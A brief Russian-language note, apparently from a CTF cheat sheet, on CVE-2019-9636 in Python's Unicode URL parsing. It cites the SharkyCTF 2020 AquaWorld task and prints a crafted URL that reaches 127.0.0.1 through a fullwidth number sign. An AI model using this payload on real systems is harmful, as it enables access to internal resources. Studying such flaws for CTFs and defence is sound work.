# CVE

[CVE-2019-9636](https://www.cvedetails.com/cve/CVE-2019-9636/) - (Python 2.7.16/3.7.2 <= ) пример эксплуатации: таск [AquaWorld](https://github.com/joshdabosh/writeups/tree/master/2020-SharkyCTF), SharkyCTF 2020: кратко, ошибка в парсинге unicode в url, в следствие чего можно было обратиться к локальному ресурсу:&#x20;

```
http://aquaworld.sharkyctf.xyz/admin-query\uFF03@127.0.0.1?flag=flag
```
